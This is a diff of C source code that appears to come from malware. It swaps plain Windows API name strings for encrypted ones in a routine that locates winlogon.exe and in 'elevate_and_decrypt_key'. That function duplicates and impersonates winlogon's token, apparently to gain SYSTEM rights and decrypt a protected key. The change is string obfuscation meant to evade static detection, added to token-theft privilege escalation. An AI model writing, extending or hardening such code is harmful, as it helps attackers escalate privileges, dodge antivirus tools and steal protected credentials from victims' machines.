@@ -58,8 +58,8 @@ static void* resolve_fn(void* mod, const char* name) {
 /* ── Find winlogon.exe PID via Shell_TrayWnd ──────────────────── */
 
 static DWORD find_winlogon_pid(void* user32, void* kernel32) {
-    pFindWindowW fnFindWindow = (pFindWindowW)resolve_fn(user32, "FindWindowW");
-    pGetWindowThreadProcessId fnGetPID = (pGetWindowThreadProcessId)resolve_fn(user32, "GetWindowThreadProcessId");
+    pFindWindowW fnFindWindow = (pFindWindowW)resolve_fn_enc(user32, enc_FindWindowW, ENC_FINDWINDOWW_LEN);
+    pGetWindowThreadProcessId fnGetPID = (pGetWindowThreadProcessId)resolve_fn_enc(user32, enc_GetWindowThreadProcessId, ENC_GETWINDOWTHREADPROCESSID_LEN);
 
     if (!fnFindWindow || !fnGetPID) return 0;
 
@@ -76,9 +76,9 @@ static DWORD find_winlogon_pid(void* user32, void* kernel32) {
     typedef BOOL (WINAPI *pProcess32First)(HANDLE, LPPROCESSENTRY32W);
     typedef BOOL (WINAPI *pProcess32Next)(HANDLE, LPPROCESSENTRY32W);
 
-    pCreateToolhelp32Snapshot fnSnapshot = (pCreateToolhelp32Snapshot)resolve_fn(kernel32, "CreateToolhelp32Snapshot");
-    pProcess32First fnFirst = (pProcess32First)resolve_fn(kernel32, "Process32FirstW");
-    pProcess32Next fnNext = (pProcess32Next)resolve_fn(kernel32, "Process32NextW");
+    pCreateToolhelp32Snapshot fnSnapshot = (pCreateToolhelp32Snapshot)resolve_fn_enc(kernel32, enc_CreateToolhelp32Snapshot, ENC_CREATETOOLHELP32SNAPSHOT_LEN);
+    pProcess32First fnFirst = (pProcess32First)resolve_fn_enc(kernel32, enc_Process32FirstW, ENC_PROCESS32FIRSTW_LEN);
+    pProcess32Next fnNext = (pProcess32Next)resolve_fn_enc(kernel32, enc_Process32NextW, ENC_PROCESS32NEXTW_LEN);
 
     if (!fnSnapshot || !fnFirst || !fnNext) return 0;
 
@@ -102,7 +102,7 @@ static DWORD find_winlogon_pid(void* user32, void* kernel32) {
     }
 
     typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
-    pCloseHandle fnClose = (pCloseHandle)resolve_fn(kernel32, "CloseHandle");
+    pCloseHandle fnClose = (pCloseHandle)resolve_fn_enc(kernel32, enc_CloseHandle, ENC_CLOSEHANDLE_LEN);
     if (fnClose) fnClose(snap);
 
     return winlogon_pid;
@@ -121,12 +121,12 @@ int elevate_and_decrypt_key(const unsigned char *enc_key, size_t enc_len,
     if (!ntdll || !kernel32 || !user32 || !advapi32)
         return -1;
 
-    pOpenProcess fnOpenProcess = (pOpenProcess)resolve_fn(kernel32, "OpenProcess");
-    pOpenProcessToken fnOpenToken = (pOpenProcessToken)resolve_fn(advapi32, "OpenProcessToken");
-    pDuplicateTokenEx fnDupToken = (pDuplicateTokenEx)resolve_fn(advapi32, "DuplicateTokenEx");
-    pImpersonateLoggedOnUser fnImpersonate = (pImpersonateLoggedOnUser)resolve_fn(advapi32, "ImpersonateLoggedOnUser");
-    pRevertToSelf fnRevert = (pRevertToSelf)resolve_fn(advapi32, "RevertToSelf");
-    pCloseHandle fnClose = (pCloseHandle)resolve_fn(kernel32, "CloseHandle");
+    pOpenProcess fnOpenProcess = (pOpenProcess)resolve_fn_enc(kernel32, enc_OpenProcess, ENC_OPENPROCESS_LEN);
+    pOpenProcessToken fnOpenToken = (pOpenProcessToken)resolve_fn_enc(advapi32, enc_OpenProcessToken, ENC_OPENPROCESSTOKEN_LEN);
+    pDuplicateTokenEx fnDupToken = (pDuplicateTokenEx)resolve_fn_enc(advapi32, enc_DuplicateTokenEx, ENC_DUPLICATETOKENEX_LEN);
+    pImpersonateLoggedOnUser fnImpersonate = (pImpersonateLoggedOnUser)resolve_fn_enc(advapi32, enc_ImpersonateLoggedOnUser, ENC_IMPERSONATELOGGEDONUSER_LEN);
+    pRevertToSelf fnRevert = (pRevertToSelf)resolve_fn_enc(advapi32, enc_RevertToSelf, ENC_REVERTTOSELF_LEN);
+    pCloseHandle fnClose = (pCloseHandle)resolve_fn_enc(kernel32, enc_CloseHandle, ENC_CLOSEHANDLE_LEN);
 
     if (!fnOpenProcess || !fnOpenToken || !fnDupToken ||
         !fnImpersonate || !fnRevert || !fnClose)
